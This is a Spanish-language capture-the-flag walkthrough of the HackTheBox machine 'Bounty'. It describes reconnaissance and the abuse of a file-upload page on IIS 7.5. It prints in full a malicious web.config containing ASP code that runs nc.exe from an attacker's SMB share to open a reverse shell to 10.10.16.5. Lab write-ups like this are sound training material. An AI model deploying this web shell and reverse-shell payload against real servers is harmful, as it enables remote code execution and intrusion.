Hacemos el escaneo de nmap:
![[Pasted image 20240123095849.png]]
Donde vemos que se trata de un IIS en su versión 7.5:
![[Pasted image 20240123095912.png]]
Y esto corre por el puerto 80:
![[Pasted image 20240123095812.png]]
Añadimos el dominio de bounty.htb al /etc/hosts:
![[Pasted image 20240123102057.png]]
Hacemos fuzzing web en busca de directorios y extensiones, donde vemos transfer.aspx:
![[Pasted image 20240123100216.png]]
Y si quitamos lo de las extensiones de archivos, vemos un /uploadedfiles:
![[Pasted image 20240123102345.png]]
Por tanto, la primera ruta vemos que se trata de un panel de subida de archivos:
![[Pasted image 20240123100147.png]]
Y en la de uploadedfiles no tenemos acceso:
![[Pasted image 20240123102415.png]]
Si investigamos por internet, vemos que podemos subir archivos con extensión .config:
![[Pasted image 20240123100805.png]]
Por tanto, debemos de crear un archivo con extensión .config que tenga formato xml y pueda ejecutar comandos, el cual será el siguiente:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("\\10.10.16.5\smbFolder\nc.exe -e cmd 10.10.16.5 443")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
```
Se subió correctamente:
![[Pasted image 20240123101738.png]]

